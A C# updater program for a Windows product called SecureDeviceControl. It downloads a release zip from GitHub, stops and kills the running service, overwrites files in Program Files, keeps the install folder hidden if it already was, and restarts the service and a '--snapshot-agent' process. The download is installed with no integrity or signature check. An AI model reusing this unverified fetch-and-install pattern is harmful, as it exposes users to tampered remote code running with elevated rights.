using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading;

internal static class Program
{
    private const string ZipUrl =
        "https://github.com/Harsh854-22/DriverBasil/releases/download/v1.0.7/SecureDeviceControl-Release.zip";

    private static int Main()
    {
        try
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var installDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                "SecureDeviceControl");
            var workDir = Path.Combine(Path.GetTempPath(), "sdc-update-1.0.7");
            Directory.CreateDirectory(workDir);
            var zipPath = Path.Combine(workDir, "update.zip");
            var extractDir = Path.Combine(workDir, "extract");

            using (var client = new WebClient())
            {
                client.DownloadFile(ZipUrl, zipPath);
            }

            Run("sc.exe", "stop SecureDeviceControl");
            Kill("SecureDeviceControl.Desktop");
            Kill("SecureDeviceControl.Service");
            Thread.Sleep(4000);

            if (Directory.Exists(extractDir))
            {
                Directory.Delete(extractDir, true);
            }

            ZipFile.ExtractToDirectory(zipPath, extractDir);
            Directory.CreateDirectory(installDir);
            var visibility = CaptureVisibility(installDir);
            foreach (var file in Directory.GetFiles(extractDir, "*", SearchOption.AllDirectories))
            {
                var relative = file.Substring(extractDir.Length).TrimStart('\\', '/');
                var dest = Path.Combine(installDir, relative);
                var destDir = Path.GetDirectoryName(dest);
                if (!string.IsNullOrEmpty(destDir))
                {
                    Directory.CreateDirectory(destDir);
                }

                ClearBlocking(dest);
                File.Copy(file, dest, true);
            }

            RestoreVisibility(installDir, visibility);
            Run("sc.exe", "config SecureDeviceControl start= auto");
            Run("sc.exe", "start SecureDeviceControl");
            Thread.Sleep(2000);
            var desktop = Path.Combine(installDir, "SecureDeviceControl.Desktop.exe");
            if (File.Exists(desktop))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = desktop,
                    Arguments = "--snapshot-agent",
                    UseShellExecute = true
                });
            }

            return 0;
        }
        catch
        {
            return 1;
        }
    }

    private static FileAttributes CaptureVisibility(string directory)
    {
        if (!Directory.Exists(directory))
        {
            return 0;
        }

        return File.GetAttributes(directory) & (FileAttributes.Hidden | FileAttributes.System);
    }

    private static void RestoreVisibility(string directory, FileAttributes visibility)
    {
        if (!Directory.Exists(directory) || visibility == 0)
        {
            return;
        }

        File.SetAttributes(directory, File.GetAttributes(directory) | visibility);
    }

    private static void ClearBlocking(string path)
    {
        if (!File.Exists(path))
        {
            return;
        }

        var attributes = File.GetAttributes(path);
        var blocking = FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly;
        if ((attributes & blocking) != 0)
        {
            File.SetAttributes(path, attributes & ~blocking);
        }
    }

    private static void Kill(string processName)
    {
        foreach (var process in Process.GetProcessesByName(processName))
        {
            try
            {
                process.Kill();
                process.WaitForExit(5000);
            }
            catch
            {
            }
        }
    }

    private static void Run(string fileName, string arguments)
    {
        try
        {
            using (var process = Process.Start(new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                CreateNoWindow = true,
                UseShellExecute = false
            }))
            {
                if (process != null)
                {
                    process.WaitForExit(20000);
                }
            }
        }
        catch
        {
        }
    }
}
